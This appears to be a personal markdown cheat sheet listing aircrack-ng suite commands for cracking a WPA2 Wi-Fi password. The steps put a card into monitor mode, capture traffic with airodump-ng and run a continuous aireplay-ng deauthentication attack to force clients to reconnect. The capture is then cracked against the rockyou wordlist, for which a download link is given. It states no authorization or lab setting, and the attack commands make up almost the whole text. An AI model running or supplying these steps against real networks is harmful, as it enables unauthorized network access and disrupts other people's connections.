---
title: Commands WPA2 handshake
completed?: yes
---

**Kills processes:**
`sudo airmon-ng check kill`

> If you want to restart the processes run the following command:
> `sudo service NetworkManager restart`

**Starts monitor mode**
`sudo airmon-ng start wlan0`

**Verify that monitor mode is used**
`sudo airmon-ng`

**Get the AP's MAC address and channel**
`sudo airodump-ng wlan0`

1.  **window 1**
    
    1.  *Fill in the channel(after -c) and bssid(after --bssid)*
    2.  `sudo airodump-ng -w hack1 -c --bssid wlan0`
    
    > Note: "hack1 is the filename where we are going to store the captures in, you can choose the name of this file as it doesn't matter, you need to make sure that you remember it tho"
    
2.  **window 2**
    
    1.  *Fill in the bssid after '-a'*
    2.  `sudo aireplay-ng --deauth 0 -a wlan0`

**Use Wireshark to open hack file**
`wireshark hack1-01.cap`

> Note: This is the filename which we've chosen in 'window 1', as there are many captures going on (unless you live under a rock or something ;P), you will get multiple files and that's why there is a '-01' added. You could even have to look in 'hack1-03.cap' to be able to find the 4-way handshake.

**Filter Wireshark messages for EAPOL**

**Stop monitor mode**
`airmon-ng stop wlan0`

**Crack file with Rock you or another wordlist**
**Make sure you have rockyou in text format (unzip file on Kali)**
`aircrack-ng hack1-01.cap -w /usr/share/wordlists/rockyou.txt`

> Note: You can find it on any Kali distribution included at the location above, mine didn't have it tho, so I had to download it :'(
> If your were out of luck like me and don't have the wordlist, [you could download it over here](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt).
> **I had to use the following command as it was not included in my Kali distro (I downloaded my wordlist)**
> `aircrack-ng hack1-01.cap -w /root/Downloads/rockyou.txt`

**We can also try this without a wordlist, you can also use a brute force attack**
